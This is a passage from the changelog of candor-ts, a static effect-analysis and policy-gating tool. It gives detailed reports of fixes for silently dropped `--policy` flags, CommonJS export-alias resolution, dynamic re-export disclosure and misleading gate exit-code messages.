# Changelog

All notable changes to candor-ts are recorded here. Format loosely follows
[Keep a Changelog](https://keepachangelog.com/) and the family convention (candor-rust's
CHANGELOG): candor is pre-1.0, so minor versions may include behavioural changes — always in the
soundness-increasing direction (the §4 trust contract) — and a **⚠** marks an entry that affects
report bytes or gate verdicts (regenerate baselines / expect verdict changes across it).

## Unreleased

- **`--policy` is now a usage error (exit 2) on eleven descriptive/comparative verbs that never honoured
  it: `show`/`where`/`callers`/`map`/`diff`/`containment`/`reachable`/`path`/`impact`/`blindspots`/`tour`.**
  BACKLOG "`--policy` accept-and-drop is THREE engines, not one" (candor-java `37c9b10` is the reference
  fix; this is the ts port). `parseCanonical` accepted `--policy <file>` for every verb — the §3.3.1
  grammar line requires that — but only STORED it into `policyFile` for a verb invoked with
  `{policy: true}`; these eleven parsed it and then never read the variable again. Verified at HEAD
  2026-08-28 against a real scan: every one of them produced BYTE-IDENTICAL output with and without
  `--policy`, no diagnostic either way — the user passes a policy, gets an answer computed WITHOUT it,
  and nothing discloses the difference (the [[candor-scan-guards]] config-disclosure class inverted: there
  a key was reported ignored WHILE honoured; here a flag is accepted WHILE dropped). None of SPEC §3.1's
  pinned JSON shapes for these eleven carries a policy-derived field (checked each one, not assumed —
  including `blindspots`/`containment`, which read as though they might and do not), so there is nothing
  for `--policy` to do here; this is the same shape `gains` already carried and already refused with its
  own tailored message. One shared check (`DESCRIPTIVE_NO_POLICY` in `query.mjs`, fired before the switch
  on `cmd`, before any report resolution/loading) applies `gains`' ⟨0.18⟩ rule ("a not-applicable flag is
  an exit-2 error, never a silent swallow") to its ten siblings, naming `gate`/`whatif`/`fix`/`fix-gate`/
  `unverified` as the policy-relative alternatives. candor-ts has no `rewire` verb, so java's twelfth
  member of that set does not exist here. **Controls, falsified against the pre-fix binary**: every verb
  that already threads `--policy` (`gate`/`whatif`/`fix`/`fix-gate`/`unverified`/`gains`) is byte-identical
  pre- and post-fix, WITH `--policy` present; every one of the eleven newly-rejecting verbs is
  byte-identical to the pre-fix binary when `--policy` is ABSENT. `CANDOR_POLICY` (env) and a checked-in
  `.candor/config` `policy` key stay INERT on all eleven, same as they already were on `gains` — an
  existing spec-sanctioned gap, not a new inconsistency this fix introduces.
  **Same surface, MCP**: `candor_show`/`candor_where`/`candor_callers`/`candor_map`/`candor_diff`/
  `candor_containment`/`candor_reachable`/`candor_path`/`candor_impact`/`candor_blindspots` never declared
  a `policy` property in their tool schemas and never read `args.policy` — a caller who reasons "the
  sibling tools (`candor_whatif`/`candor_fix`/`candor_gate`/`candor_unverified`) take `policy`, this one
  probably does too" hits the identical hazard the CLI had. Measured the same way: `candor_where`/
  `candor_show` returned byte-identical results with and without a `policy` argument. Also found on this
  sweep and fixed alongside it: **`candor_gains` had the same gap on this surface** — unlike the CLI's
  `gains`, which has always refused `--policy`, the MCP tool never did. The `tools/call` dispatcher now
  refuses any `policy` argument for a tool whose OWN schema does not declare `policy` as a property —
  derived from each tool's schema rather than a maintained name list, so a future tool that legitimately
  wants `policy` needs no entry here; it lists `policy` among its own properties and reads it, and the
  check gets out of its way. **LSP has no equivalent gap**: its only two `workspace/executeCommand`
  commands (`candor.whatif`, `candor.fix`) take no per-call `policy` argument at all — both resolve the
  live discovered policy (`CANDOR_POLICY` / `.candor/config`) server-side, the same source the standing
  diagnostics use, so there is no descriptive-verb command surface on this route to have the bug in the
  first place. One pre-existing test (`test.mjs`, the ⟨0.28⟩ "given no value" battery) asserted that
  `where Fs --report R --policy --json` diagnoses "--policy was given no value" — true before this fix,
  since `where` still threaded `--policy` into shape-checking; superseded now that `where` rejects
  `--policy` outright before any value is inspected (the same precedence `gains` already used), so the row
  was updated to assert the new, more specific ⟨0.34⟩ diagnostic. The "given no value" mechanism itself
  stays covered by the neighbouring `gate` row, unaffected by this rung.

- **⟨0.34⟩ ITEM 1: the ⟨0.33⟩ cross-policy remedy now names its ACTUAL cause — message-only, verdict and
  `--gate-json`/`whatif --json` unchanged.** `gate --report` and the LSP's live diagnostics (which also
  drive `candor.whatif`) name a report whose peek was bounded by a deny set narrower than the policy in
  force as *"this report's peek was bounded by the deny set its producing scan held, and that set does not
  cover N rule(s) of this policy"* — TRUE of a ≥⟨0.33⟩ producer that genuinely scanned under a different
  deny set, but MISLEADING of a report that predates ⟨0.33⟩ entirely: such a producer never had a
  `scannedUnder` key to hold ANY deny set in, so "does not cover" reads as "chose a different policy" where
  the truth is "could not yet record one". Both readers now check the report's own envelope `spec` (new
  `query-core.mjs` `specPredates`, unparseable/absent treated as predating) and print a second sentence
  naming the real cause and the remedy ("re-scan with a 0.33+ engine under THE SAME policy") whenever every
  report that contributed to the cause predates the rung; a SINGLE ≥⟨0.33⟩ contributor keeps the original
  sentence, because for that report the narrower deny set is real. The version is used ONLY to choose which
  of two already-true sentences to print — SPEC ⟨0.34⟩ explicitly RULED OUT a version floor for the
  VERDICT (a report's age cannot license certification: a pre-⟨0.33⟩ producer's peek was still bounded by
  SOME policy nobody here can see, so refusing is correct either way).
  Route inventory (mandatory per the corpus brief, swept rather than scoped to the verb touched first):
  `reportUnaskedRulesDetail` (feeding `reportCompleteness`, hence `whatif`/`fix-gate`/`unverified` and the
  MCP tools sharing it) and `loadGateReport`'s own copy (feeding `gate --report` and `candor_gate`) are the
  ONLY two places in this engine that ever compute the cause — confirmed by grep, not assumed — and each
  now carries the identical spec-driven choice from the identical per-report accounting. Of the two places
  that turn the cause into PROSE, only `query.mjs`'s `gate --report` stderr and `lsp.mjs`'s
  `discloseIncompleteness` (shared by the standing diagnostics and `candor.whatif`) ever did; the CLI
  advisory verbs (`whatif`/`fix-gate`/`unverified`) and every MCP tool disclose this cause as a bare
  `unaskedRules` array with no accompanying sentence, so there was no prose to reword there. `candor-scan`'s
  own `--policy` route structurally cannot raise this cause at all (`scannedUnder` always covers its own
  run's policy by construction, confirmed: it never even references `unaskedRules`), so §3.1 byte-equality
  between `scan --policy`'s `--gate-json` and `gate --report`'s was never at risk. Two test fixtures (one
  in `test-mcp.mjs`, duplicated across its two ⟨0.30⟩/⟨0.32⟩/⟨0.33⟩ blocks; one in `test.mjs`'s ⟨0.33⟩
  no-`scannedUnder` row) paired a spec with a `scannedUnder` shape no real engine at that spec could have
  produced (a `spec` too old to have written the key it writes, and the mirror — a `spec` new enough to
  have written the key beside a report that omits it while claiming to model "the shape every pre-⟨0.33⟩
  report is in") — corrected rather than left to pass by coincidence. Controls (falsified against the
  pre-change binary first): a ≥⟨0.33⟩ report's message is byte-identical to the pre-⟨0.34⟩ text; a
  pre-⟨0.33⟩ report's message names the real cause on both the CLI and the LSP log channel and never says
  "does not cover" (the pre-change binary, confirmed via a hand-built fixture, printed the misleading
  sentence for it); the `--gate-json` document carries no new key and is identical between the two causes;
  `reportCompleteness` and `loadGateReport` agree on the cause-naming flag over identical bytes (new
  `test-unit.mjs` row, offline).

- **fix: two of R57's own residual shapes closed — a raw effect or closure embedded directly in a
  decorator's ARGUMENT DATA no longer vanishes; a third stays open, measured rather than guessed.**
  candor-spec SOUNDNESS.md R64, filed live-reproducing R57's own pinning row the day after `0a5d493`
  shipped. R57 minted a unit for an ANONYMOUS decorator VALUE (direct, or a factory's callee) but never
  reached into a factory's ARGUMENTS — so `@Decorate(fs.readFileSync(...))` (a raw effect evaluated
  directly as the argument) and `@Factory({ init: () => { fs.readFileSync(...) } })` (a closure nested in
  the argument DATA, not the call chain — the real TypeORM `@Column({ default: () => … })` idiom) climbed
  straight through the object literal/argument list to `enclosing()`'s Decorator guard with nothing behind
  them: silent, `functions: []`, `deny Fs` exit 0. A third shape — an EXTERNAL body-less decorator
  reference (`@ExternalDecorator()` from an unread dependency) — is the same silent gap but is NOT fixed
  here; see the measurement below.
  THE FIX: `enclosing()` now tracks the child it climbed FROM at each step (`prev`). When the current node
  is the decorator's OWN call/new-expression and `prev` is one of ITS ARGUMENTS (not the callee), it mints
  a `<decorator-arg>@<pos>` unit (keyed to the decorator's own call, `unitKind: "initializer"`, mirroring
  `staticBlockUnit`/`moduleUnit`) instead of falling through to the Decorator guard — every effect/call
  anywhere in ONE decorator's argument list shares that one unit. The decorator's OWN top-level application
  (`prev` still unset — R57's original case, and R64 shape 3) is untouched: the Decorator guard still
  returns `null` for it, exactly as before.
  WHY SHAPE 3 STAYS OPEN, MEASURED NOT GUESSED: R57's commit rejected a blanket fix on the argument that it
  would mint an entry for nearly every decorated declaration in real framework code, but had never actually
  measured that against decorator-bearing code (its own corpus had none). This fix's shapes 1/2 change
  targets ONLY argument DATA, so it was measured directly; an experimental blanket variant that ALSO mints
  for the decorator's own application (simulating the rejected fix) was measured separately, against THREE
  real corpora with dependencies genuinely installed: byte-identical to the narrow fix on a real NestJS +
  TypeORM application (`lujakob/nestjs-realworld-example-app`) and on TypeORM's own 513-file functional
  test suite (`typeorm/typeorm`, `test/functional/{columns,relations,entity-schema,repository,
  query-builder}`, re-pointed at the real installed package so its decorators actually resolve) — but +42
  new report rows (52% over the base 80) on a real Angular application (`gothinkster/
  angular-realworld-example-app`, deps installed): every bare `@Injectable()`/`@Component()`/`@Pipe()`
  application gained its own `invisible`-only row. Zero fabricated effects in any of the three — the cost
  is report-row inflation, not wrong verdicts — but on the corpus most likely to be gated in CI, it
  reproduces exactly the flood R57 measured-by-argument and this fix measured directly. Left open.
  OVER-CHARGE CONTROL, the narrow (shipped) fix, measured on the SAME three real corpora: zero existing
  functions' `inferred` changed, zero new `Unknown` entries, on all three. The only real-world hits were on
  the TypeORM corpus — 3 new `<decorator-arg>` units, all `inferred: []`, disclosing `invisible: ["dedent"]`
  (a genuine, unmodified `@VirtualColumn({ query: (alias) => sql\`...\` })` closure calling into an unread
  `dedent` import) — an honest disclosure of a real blind spot, never a fabricated effect. `analyzed.count`
  moved (+105 on the NestJS+TypeORM app, +548 on the TypeORM corpus, +28 on the Angular app — new units
  minted and found pure) while `functions.length` (the report surface) did not, on two of the three; the
  Angular number above is the one exception, and it is the blanket variant's number, not this fix's.
  Falsified against the pre-fix binary (`9a8a5c7`, before this commit): the three fixtures below all read
  `functions: []`/`deny Fs` exit 0 pre-fix; shapes 1 and 2 read the disclosed effect/exit 1 post-fix, shape
  3 is unchanged on both. `node test.mjs --parallel`: 1613 passed, 0 failed (was 1605).

## [0.33.1] — 2026-08-27

- **⚠ the fifth "neither voice fired" instance — a DYNAMIC re-export loop — is disclosed, not resolved,
  closing the family `1d4f648` filed rather than fixed.** `Object.keys(impl).forEach(k => { exports[k] =
  impl[k]; })` binds an export name to a RUNTIME STRING: unlike the four export-alias shapes fixed before
  it, there is no per-statement match to make — the bound name does not exist until the loop runs, so
  minting an alias for it would be a guess, not analysis. CONFIRMED that reading by reproducing the exact
  three-conjunct silence chained (`--dep-inits`): `node_modules/rkit/index.js` copies `{ thing, other }`
  from an `impl` object onto `exports` via the loop above (`thing` does `fs.writeFileSync`, `other` is
  pure), `index.d.ts` declares both ambiently; `deny Fs Unknown` on a consumer calling `thing()` read
  `policy ✓` at exit 0 before this fix — the named join misses (no static assignment ever names `thing`),
  the covered-package arm correctly declines (SPEC §2 rule 3: a covered report's silence under a key is
  that key's purity claim), and `unanswerableKey` correctly says a plain ambient function decl is
  answerable in general. FIXED by disclosure at the one place that trusts a covered package's silence
  (`disclosureTail`): the producer's own walk now recognizes THREE spellings of "this module performs a
  dynamic re-export" — `exports[k] = …`/`module.exports[k] = …` (a non-literal element-access key),
  its `Object.defineProperty(exports, k, …)` descriptor twin (the shape TypeScript's own `__createBinding`
  helper and date-fns's published `fp.cjs` both use), and the whole-object reassignment's computed-property
  spelling (`module.exports = { [k]: … }`) — and counts them (`envelope.dynamicReexport.count`, omitted
  when zero, the same wire-compatibility rule as every other envelope field on this file). NEVER
  resolves a single name. A chained consumer (`--dep-inits`/`CANDOR_DEPS`/`--workspace` — one loader, so
  all three inherit the fix at once) reads the count and, only where the existing `unanswerableKey`
  disclosure is silent AND the package is otherwise covered, discloses `Unknown` with
  `reflect:dynamic-reexport:<pkg>` — the same `reflect:`/dynamic-key vocabulary `reflect:defineProperty:
  dynamic-key` already uses for the single-scan runtime-accessor case, reused rather than a new class
  minted. MEASURED red→green across scan, `gate`, and the live LSP (hover + diagnostics), all reading the
  same report: before the fix, `deny Fs Unknown` was `policy ✓` at exit 0 and the LSP hover was empty over
  the real `fs.writeFileSync`; after, the gate fires `[AS-EFF-006]` at exit 1 and the hover/diagnostic both
  name `reflect:dynamic-reexport:rkit`. OVER-CHARGE CONTROL: the genuinely pure `other` gains the same
  `Unknown`, never a fabricated `Fs` — disclosure, not a guess at which effect. Quantified across 117
  installed `node_modules` packages (`corpus1-ts`, including scoped sub-packages) and 14 published npm
  tarballs (`corpus2-ts`): every package's `functions[]` is BYTE-IDENTICAL to pre-fix output (0 diffs);
  exactly three packages carry a real dynamic re-export — `@kwsites/file-exists` and `follow-redirects`
  (the bracket-write form, found in the wild, not synthetic) and date-fns@4.4.0 (736 descriptor-form call
  sites across its three published CJS barrels — `fp.cjs`, `index.cjs`, `locale.cjs` — each a whole
  namespace built this way). A FALSE-POSITIVE SOURCE was found and closed before it reached this count:
  `Object.defineProperty(exports, Symbol.toStringTag, { value: "Module" })` — esbuild/Rollup/tsup's own
  standard ESM-interop stamp, present in a large fraction of bundled CJS output
  (`@simple-git/args-pathspec`, `@simple-git/argv-parser` both tripped it)
  — carries no forwarding semantics at all (a Symbol-keyed property can never be the target of
  `import { name } from 'pkg'`), so a well-known-symbol key is excluded everywhere this pass looks for a
  "dynamic" one. Also verified cheaply, per the same commit's note that it was "added" without a check:
  the bracket-notation alias site `exports['thing'] = REF` DOES resolve correctly (a real `deny Fs`
  fires chained, exit 1) — it was the string-LITERAL bracket spelling `658e3c0`'s family already covers,
  not this fix's shape. IS A SIXTH INSTANCE CONSTRUCTIBLE? Checked and answered no, for now: the identical
  loop written inside a single project (no package boundary — `require('./impl')` with no `.d.ts`) already
  reads `Unknown[callback:reexp.thing]` today, because an untyped CommonJS `require` result gives the
  checker nothing to resolve the call ONTO in the first place — the generic unresolved-call disclosure
  already covers it, independent of this fix. The gap this fix closes is specific to the package
  boundary, where a `.d.ts` gives the checker a real (if wrong) declaration to call `unanswerableKey`
  answerable on. Full battery green: lint, 126 unit tests, 1596 behavioral tests (7 new, pinned with
  their controls), 174 MCP, 101 LSP, 16 watch, probe, fuzz, transitive-recall, self-gate, sensitivity
  battery (8/8), and the full four-way conformance suite against candor-spec (`conformance/run.sh`,
  `conformance: OK`, every PART still MATCH) — unaffected, since this rung has no spec clause of its own
  and no other engine shares this report format; the run is a pure regression check that nothing else moved.

- **`query.mjs`'s `gateLine()` had the same wrong-checkable-claim defect `658e3c0` fixed in the LSP,
  and one variant of it was WORSE than the LSP's.** MEASURED (fixtures: an unread exclusion class beside
  an Exec violation; an unanalyzed file beside an Fs violation): `gateLine()` unconditionally asserted
  `` `gate --report` exits 2 over these bytes `` — or, for the unread-only cause, "under any policy it can
  evaluate" — with no check for SPEC §3.1's precedence (violation (1) > refusal (2) > incomplete (2)). A
  coexisting certain violation makes the real exit 1, not 2, and `gateLine()` feeds `incompleteAnswerNote`,
  shared by ELEVEN verbs (`where`, `callers`, `show`, `map`, `reachable`, `containment`, `blindspots`,
  `gains`, `diff`, `tour`, `path`), so every one of them could print the false claim. FIXED with a cheap,
  side-effect-free `certainViolationOver` pre-check (discovers a policy the same way the gate-family verbs
  do when `--policy` is absent — CANDOR_POLICY, then `.candor/config` — since these eleven hold none of
  their own) and conditions the wording on it; the incompleteness-only control (no coexisting violation)
  is byte-identical.
  A FIRST ATTEMPT at this fix introduced the exact "opposite error" its own review warns against:
  folding a corrupt-report-FILE cause (`unreadable`) into the same certain-violation branch as
  `unanalyzed` claimed a false "1, not 2" dominance, when a CORRUPTION refusal is proven — against the
  real `gate` verb's own ruling — to dominate ABSOLUTELY, never the other way round. `unreadable` now
  gets its own always-unconditional arm, checked first, before the pre-check even runs.
  WIDENING THE INVENTORY (per the corpus brief's rule 9 — an audit's boundary must not be drawn around
  its own trigger) surfaced two further, confirmed instances of the identical defect, both fixed the same
  way: `advisoryNoManifestNote` and `advisoryJudgedNothingNote` (used by `whatif`/`fix-gate`/`unverified`)
  also asserted an unconditioned `` `gate --report` exits 0 `` for a `noManifest`/`judgedNothing` report
  FILE — true only when nothing else under a multi-report locator judged real content. MEASURED: a
  prefix with one silent/manifest-less sibling beside another carrying a certain `deny Fs` violation
  makes `gate --report` exit 1 (the real gate's OWN `judgedNothing` is a single union across siblings —
  "judged something as soon as ONE has" — so the violating sibling drags the whole locator into ordinary
  evaluation, unlike the advisory reader's PER-FILE `judgedNothing`/`noManifest` lists),
  while `unverified --strict`/`fix-gate --strict` printed "NOTHING DOWNSTREAM WILL CATCH THIS FOR YOU" and
  exited 0 themselves. `advisoryUnreadableNote` was checked and left alone — its `unreadable` cause is the
  same absolute, non-dominated refusal as `gateLine`'s, confirmed against the real gate's own ruling.
  A THIRD, DIFFERENT bug on the same function was also found and fixed while widening this inventory:
  `outOfScope` (⟨0.30⟩'s own exit-2 INCOMPLETE cause) had no arm in `gateLine()` at all and fell through
  to the "exits 0 … NOTHING DOWNSTREAM WILL CATCH THIS" tail meant for `judgedNothing`/`noManifest` — the
  worse of the two possible wordings on that cause, since an `outOfScope`-only report already exits 2
  before any violation is considered. MEASURED and moved to the dominated tier beside `unanalyzed`.
  `mcp.mjs`'s `candor_gate` (already checked before this fix and confirmed clean — it computes fresh per
  call) and every other live prose site asserting a `gate --report` exit code in `lsp.mjs`/`query-core.mjs`
  were swept for the same shape; none of the remaining ones carry it (`advisoryUnreadableNote`'s absolute
  refusal and `zeroRulePolicyWarn`'s zero-rule refusal are both non-dominated by construction — a
  zero-rule policy has no violation to dominate with). Full battery green: lint, 126 unit tests, 1589
  behavioral tests, 174 MCP, 101 LSP, 16 watch, probe, fuzz, transitive-recall, self-gate, effect-set
  oracle (26/26).
- **The own-`.d.ts`-shadow fix gains its pinned tests.** The fix landed with its evidence in a
  scratchpad; these 76 lines put the defect and its controls in `test.mjs` so a refactor cannot
  silently revert them. Suite: 1589 passed, 0 failed.
- **⚠ a named ambient `declare function` export whose DECLARED name differs from the dependency's own
  implementation identifier reached total silence — the fourth "neither voice fired" shape, and the most
  common yet.** MEASURED: `node_modules/mkit/index.js` has `function _internalImplName() { return
  fs.writeFileSync(...) }; module.exports = { thing: _internalImplName };` beside
  `index.d.ts`'s `export declare function thing(): void;`; `src/app.ts` does `import { thing } from
  "mkit"; export function run() { thing(); }` under `deny Fs`. Unchained, this correctly discloses
  `invisible: ['mkit']`. Chained (`--dep-inits` or `CANDOR_DEPS`) it read `policy ✓` at exit 0 — `gate
  --report` agreed, and the live LSP published no diagnostic either. ROOT CAUSE: three individually
  correct checks conjoin into silence. The named join looks up `mkit#thing` (the `.d.ts`'s declared
  name) in the chained dep's report; the dep's OWN scan hashed the same body under `mkit#_internalImplName`
  (`unitHash` derives the tail from the producer's LOCAL declaration name, never from any export alias),
  so the join correctly misses. `depCoveredPkgs.has('mkit')` is true, so the uncurated-blind-package arm
  correctly declines (SPEC §2 rule 3: a covered report's silence under a key is that key's purity claim).
  And `unanswerableKey` correctly returns `null` for a plain named ambient `FunctionDeclaration`, because
  its own invariant says a body could exist under that key in some implementation — which is true in
  general, just false for THIS declaration, whose only implementation lives under a DIFFERENT name.
  Considered and rejected: widening `unanswerableKey`'s enumeration (any named-join miss over a chained
  dep discloses `Unknown`) would flood every function a dep legitimately never exports under that exact
  spelling; and the §2.2-disagreement idea ("did the report analyse this NAME at all?") is not
  computable from the wire — `analyzed.digest` is one opaque whole-set FNV-1a fingerprint, not a
  per-name membership index, so a consumer cannot ask it about `thing` in isolation.
  FIX resolves at the PRODUCER instead of hedging at the consumer: teach the report-writer to recognize a
  CJS export-alias — `module.exports = { NAME: identifier }`, `exports.NAME = identifier`, and
  `module.exports.NAME = identifier`, where the right-hand side is a bare Identifier reference to a
  declaration this same scan already minted a unit for (resolved through `checker.getSymbolAtLocation`
  + `getAliasedSymbol`, the same move `5b9cfd5`'s `.d.ts`-shadow redirect uses, so it also threads
  through a `require()`-based cross-file re-export, e.g. `index.js`'s `module.exports.sync =
  requiredImpl` aggregating a sibling file's export under a public name) — and mint a SECOND report
  entry for the SAME unit under the exported name's own hash, sharing every effect-accumulating `Set`
  with the original so the pass-3 fixpoint computes one answer for both keys. `unitHash` is corrected via
  a small `aliasHashTail` side-table (the alias shares its rec's `local` field with the original, so
  `unitHash` needs to know which of the two names it is being asked for). CLASSES ARE EXCLUDED ON
  PURPOSE: `export class X {}` compiles to a SELF-referential `exports.X = X`, and `X`'s own unit is the
  synthesized `X.constructor`, not bare `X` — treating the export statement as a rename candidate would
  mint a spurious SECOND contributor to a hash a `new X()` call already joins correctly (measured against
  date-fns's `ValueSetter`, caught before it shipped). CONTROLS: a dep report that genuinely lists a
  function as pure (`pkit`'s `pureThing` alias of a pure `_pureInternal`) stays silent in `functions[]`
  end-to-end — `analyzed.count` grows to include the alias, `policy ✓` unmoved; unchained scans, and
  named joins where the declared name already matches the implementation, are untouched (the alias qual
  equals the original qual and is skipped). Quantified across 14 published npm tarballs (`corpus2-ts`)
  and 113 installed `node_modules` packages (`corpus1-ts`): 13 new report entries in each corpus,
  every one an honest `Unknown` disclosure or a resolved real effect (never a fabrication), spot-checked
  including zod's `v4/mini` reserved-word exports (`exports.null`/`void`/`enum`/`catch`/`instanceof` for
  `_null`/`_void`/`_enum`/`_catch`/`_instanceof`) and get-package-type's `require()`-aggregated
  `index.js`'s `.sync` re-export of `sync.cjs`'s `getPackageTypeSync`. The three previously-fixed defects
  (`.d.ts`-shadow, `--dep-inits` call/construct-signature silence, the whole-module-name-collision
  fabrication) stay fixed, byte-identical against pre-fix output. `gate --report` and the live LSP both
  follow from the corrected report with no separate fix needed on either route.
  Separately, lower severity: the LSP's incompleteness disclosure asserted a fixed `gate --report`/CI
  exit code (2, INCOMPLETE) that is wrong whenever a certain violation ALSO fires elsewhere in the same
  report — `query.mjs`'s own documented precedence (SPEC §3.1 `7271c69`) has a firing rule dominate a
  refusal, so the real exit is 1. `discloseIncompleteness` now names whichever is true.

- **⚠ the export-alias fix above was `BinaryExpression`-only; the FOURTH shape sharing its RHS was a
  different node entirely and stayed silent.** MEASURED: `node_modules/gkit/index.js` has
  `function _internalImplName() { return fs.writeFileSync(...) }` beside `Object.defineProperty(exports,
  "thing", { enumerable: true, get: function () { return _internalImplName; } })` — TSC's OWN standard
  CommonJS emit for `export { x } from './impl'`, and what webpack/rollup's ESM<->CJS interop shims emit
  too, so this is not an exotic shape but a large fraction of what published packages actually ship.
  Chained, `deny Fs` read `policy ✓` at exit 0 over the same three-conjunct silence as the fixed shapes.
  Considered whether a single checker-driven formulation closes the FAMILY rather than the next syntax:
  `checker.getExportsOfModule` + `getAliasedSymbol` DOES unify `exports.NAME =`/`module.exports.NAME =`/
  the bracket spelling into one alias-symbol resolution (verified — it already resolves these without any
  RHS-shape matching), but MEASURED to return zero exports for a whole-object `module.exports = {...}`
  reassignment and a non-alias symbol pointing at the bare `CallExpression` for `Object.defineProperty`
  regardless of `get`/`value` — TypeScript's own CommonJS binder does not build a unified export table for
  either, so a full family-closure is not tractable through the checker alone. FIX enumerates the
  descriptor form as a fourth candidate site (`Object.defineProperty(exports, "NAME", { get(){ return
  REF } })` / `{ value: REF }`) and — since the four sites now share one open question, "does this
  reference resolve to a unit already minted?" — widens what counts as a REF everywhere: not just a bare
  Identifier but a namespace-member access too (`impl_1.x`, what TSC emits for a CROSS-FILE `export { x }
  from './impl'`; MEASURED against this repo's own `tsc` output that `checker.getSymbolAtLocation` walks
  straight through it to the real declaration, identically to a same-file identifier), and adds the
  bracket spelling `exports['NAME'] = REF` to the existing dot-notation site. All four candidate sites now
  resolve through the identical `getSymbolAtLocation` + `getAliasedSymbol` call; `unanswerableKey` is
  untouched, and classes stay excluded for the reason already on record. CONTROLS: a genuinely pure
  aliased function (`pkit`'s `pureThing`, and a `get(){ return pureFn }` descriptor variant built for this
  fix) stays silent end-to-end; the three previously-fixed shapes are re-verified byte-identical; a
  same-file bare-identifier getter, a cross-file `impl_1.x` getter, a `value:` data descriptor, and the
  bracket spelling all mint the alias correctly; a self-referential class export through the descriptor
  form mints no spurious second hash. Quantified across the same two corpora (113 `node_modules`
  packages, 14 npm tarballs): 32 new report entries, every one spot-checked — all `Unknown`, none a
  fabricated concrete effect (the corpus's descriptor-form re-exports happen to resolve through a
  co-located `.d.ts`/`.d.cts`, which the pre-existing body-less-declaration invariant already forces to
  `Unknown` unconditionally, so this shape cannot read silently pure even where it is imprecise); zero
  existing entries changed. SEPARATELY EXAMINED, NOT FIXED: a DYNAMIC re-export loop
  (`Object.keys(x).forEach(k => exports[computed(k)] = x[k])`, the shape `tslib`/rollup's `__exportStar`
  generalizes into when the forwarded name is itself computed) — MEASURED to still read silently pure
  end-to-end (`deny Fs` exits 0 over a real `fs.writeFileSync`). This is not this fix's shape: the bound
  name is a runtime string no static per-statement matcher can read, so resolving it would be guessing,
  not analysis. It belongs to the `reflect:`/dynamic-key DISCLOSURE family (say "an export exists here
  candor cannot name"), not to alias resolution, and is filed as the fifth "neither voice fired" instance
  rather than attempted here.

- **⚠ a `.js` entry file's own co-located `.d.ts` shadowed CROSS-FILE calls into it, and the fallback
  was silence — the published npm tarball of a package under-reported against its own source.**
  MEASURED against got@15.1.0: `deny Rand` scanning the git-tag SOURCE (`source/`, `--policy`) exits 1
  with 17 violations, including `core.index.Request._beforeError` (fires on essentially every
  network-error/retry path) and the package's own public entry point; scanning the IDENTICAL release's
  COMPILED tarball (`dist/source`, `--allow-js`) at the same `analyzed.count: 334` exits 0, clean.
  ROOT CAUSE: npm ships `dist/foo.js` beside `dist/foo.d.ts`, and TypeScript's checker types every
  CROSS-FILE reference to `foo.js` through the co-located `.d.ts` — even when this scan is analysing
  `foo.js` itself as project source (a same-file reference, `this.method()`, is unaffected; only a call
  from a SIBLING module goes through the declaration file). `calculateRetryDelay({...})`, called from
  `core/index.ts`'s `_beforeError` (got's retry-jitter helper, `Math.random()` at
  `core/calculate-retry-delay.ts:38`), and `new RequestError(...)`/`new TimeoutError(...)` alike,
  resolved onto a node INSIDE `calculate-retry-delay.d.ts`/`errors.d.ts`. `declModule` was RIGHT to
  call that `.d.ts` foreign to `projectFiles` (the file walk deliberately excludes every `.d.ts`) — but
  nothing downstream was built for "foreign file that is secretly the scan's own code":
  `crossesPackageBoundary` is (correctly) false for it, so the cross-package arm's `blind`/
  `unanswerableKey` disclosures both declined to fire, on file identity they were never wrong about —
  and the call vanished, silently, on the exact gate got's own source correctly fails.
  FIX resolves rather than hedges: a cross-file call whose declaration lands in a `.d.ts` with a SIBLING
  implementation file this scan already analysed (`projectFiles`) now asks that sibling's OWN module
  symbol for the export matching the callee's name — not a cross-module import lookup, just a SourceFile
  already open in this program answering for itself — and redirects onto the real declaration, so every
  existing local-call arm (class-CHA fan-out, HOF flow, coercion desugars) runs unchanged. An ambiguous
  or unminted match still discloses `Unknown` rather than dropping. CONTROLS: TS-source scans are
  byte-identical to pre-fix (`cmp` against the pre-change binary's output over got's own source); a
  `.js` with no sibling `.d.ts` is byte-identical; an ordinary `@types/node` call (no sibling
  implementation in `projectFiles`) is byte-identical. Quantified across 14 published
  npm tarballs + 113 installed `node_modules` packages: 104 functions gained a previously-silent effect
  (52 an honest `Unknown` disclosure where the call used to vanish entirely, 52 a resolved real effect —
  spot-checked `date-fns`'s `isToday`/`endOfTomorrow` family (`Clock`, via a shared `constructNow`
  helper), `rimraf`'s `rimrafWindowsDir` (`Rand`, via `rimraf-move-remove.js`), and got's own retry path
  against every one confirmed TRUE). Also surfaced, as a side effect rather than this fix's target: a
  PRE-EXISTING, separate fabrication where a scanned package whose own name collides with a κ-curated
  network-client name (`got`, `chokidar`) had unresolved same-package constructions charged that
  package's whole-module effect wholesale onto its own pure internals (got's `isSameOrigin`/
  `usesUnixSocket`, chokidar's `FSWatcher` construction) — this fix's redirect removes it wherever the
  redirect resolves, but does not close the class for a case where the redirect still fails; filed as an
  open follow-on, not claimed closed here. Full test battery green.

- **⚠ `--dep-inits` silently dropped a call it could not join, turning a correctly-flagged blind spot
  into a clean pass — the exact cardinal sin the flag exists to shrink.** MEASURED on published
  0.33.0: `import * as tar from 'tar'; export function run() { return tar.create({file:'out.tar'},
  ['.']); }` under `deny Fs` discloses `invisible: ["tar"]` and `coverage.uncovered` without the flag
  (honest — the classifier doesn't cover `tar`); WITH `--dep-inits` — the flag whose whole point is to
  chain `tar`'s own scanned effects into the join — `app.run` vanished from `functions` entirely
  (`callgraph["app.run"]` read `[]`), `policy ✓` at exit 0, no `Unknown`, no `invisible`, no stderr hint.
  ROOT CAUSE: `tar.create` is typed `TarCommand<AsyncClass, SyncClass>`, an intersection of BARE call
  signatures (`{ (opt): T } & { (opt, entries): T } & …`) with no member name — `checker
  .getResolvedSignature` resolves to a `CallSignatureDeclaration` whose parent is a `TypeLiteral`, not a
  `PropertySignature`/`MethodSignature`. `unanswerableKey` (the one place SPEC §4's "no body could ever
  exist under this key" disclosure decides whether to fire) did not recognize this shape, so once
  `--dep-inits` marked `tar` as a chained/covered package the ledger's `invisible` hedge fell silent
  (correctly — the package IS covered) and the abstraction-disclosure arm ALSO stayed silent (incorrectly
  — it had no abstraction to name), leaving neither voice to speak: total silence instead of `Unknown`.
  Generalized the same fix to a bare `FunctionTypeNode` with no property/method parent — the shape a
  `.d.ts` emits for an ordinary `export const f: (x) => y = (x) => {...}` value-binding export (measured
  independently reproducible against `chownr`, unrelated to tar's specific intersection shape) — since
  the join two blocks up already builds no key for either shape (`nameDecl.name` is `undefined` on both
